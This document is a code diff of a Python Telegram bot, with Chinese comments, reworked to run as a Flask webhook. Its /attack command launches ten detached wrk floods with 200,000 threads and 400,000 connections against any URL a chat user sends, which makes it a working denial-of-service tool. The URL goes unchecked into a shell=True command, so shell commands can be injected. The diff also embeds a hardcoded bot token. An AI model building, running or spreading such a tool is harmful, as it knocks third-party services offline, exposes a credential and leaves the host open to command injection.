@@ -1,71 +1,62 @@
-import requests
+import os
 import random
 import string
 import subprocess
+from flask import Flask, request
+import requests
 
-# 机器人Token
+# 初始化 Telegram Bot
 BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"
-BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-# 随机生成screen名称
+# Flask 应用初始化
+app = Flask(__name__)
+
 def generate_screen_name():
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+    """生成随机 screen 名称"""
+    return "screen_" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
-# 执行攻击命令
-def execute_attack(url: str):
-    screen_name = generate_screen_name()
-    command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
+def execute_wrk(url):
+    """启动 10 个不同的 screen 会话，每个会话执行一次 wrk 命令"""
     results = []
-    try:
-        for i in range(10):
+    for i in range(10):
+        screen_name = generate_screen_name()
+        command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
+        try:
             subprocess.run(command, shell=True, check=True)
-            results.append(f"Task {i+1}: Executed")
-    except subprocess.CalledProcessError as e:
-        results.append(f"Error: {e}")
+            results.append(f"Started attack in screen session: {screen_name}")
+        except subprocess.CalledProcessError as e:
+            results.append(f"Failed to execute wrk in screen {screen_name}: {str(e)}")
     return "\n".join(results)
 
-# 获取更新消息
-def get_updates(offset=None):
-    params = {"offset": offset, "timeout": 30}
-    response = requests.get(f"{BASE_URL}/getUpdates", params=params)
-    return response.json()
-
-# 发送消息
 def send_message(chat_id, text):
-    data = {"chat_id": chat_id, "text": text}
-    requests.post(f"{BASE_URL}/sendMessage", data=data)
+    """发送消息给 Telegram 用户"""
+    payload = {"chat_id": chat_id, "text": text}
+    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)
 
-# 主循环
-def main():
-    last_update_id = None
+@app.route(f"/{BOT_TOKEN}", methods=["POST"])
+def handle_update():
+    """处理 Telegram 的更新"""
+    update = request.get_json()
+    if not update or "message" not in update:
+        return "ok", 200
 
-    while True:
-        updates = get_updates(offset=last_update_id)
+    message = update["message"]
+    chat_id = message["chat"]["id"]
+    text = message.get("text", "")
 
-        if "result" in updates and updates["result"]:
-            for update in updates["result"]:
-                last_update_id = update["update_id"] + 1
+    if text.startswith("/attack"):
+        try:
+            url = text.split(" ", 1)[1]
+            result = execute_wrk(url)
+            send_message(chat_id, result)
+        except IndexError:
+            send_message(chat_id, "Usage: /attack <url>")
+    else:
+        send_message(chat_id, "Unsupported command.")
 
-                # 获取消息和发送者信息
-                message = update.get("message", {})
-                chat_id = message.get("chat", {}).get("id")
-                text = message.get("text", "")
-
-                # 检测命令 /attack
-                if text.startswith("/attack"):
-                    parts = text.split()
-                    if len(parts) != 2:
-                        send_message(chat_id, "Usage: /attack <url>")
-                        continue
-
-                    url = parts[1]
-                    send_message(chat_id, f"Starting attack on {url}...")
-
-                    # 执行攻击命令
-                    results = execute_attack(url)
-
-                    # 返回结果
-                    send_message(chat_id, f"Attack results:\n{results}")
+    return "ok", 200
 
 if __name__ == "__main__":
-    main()
+    # 设置 Flask 应用监听
+    app.run(host="0.0.0.0", port=5000)
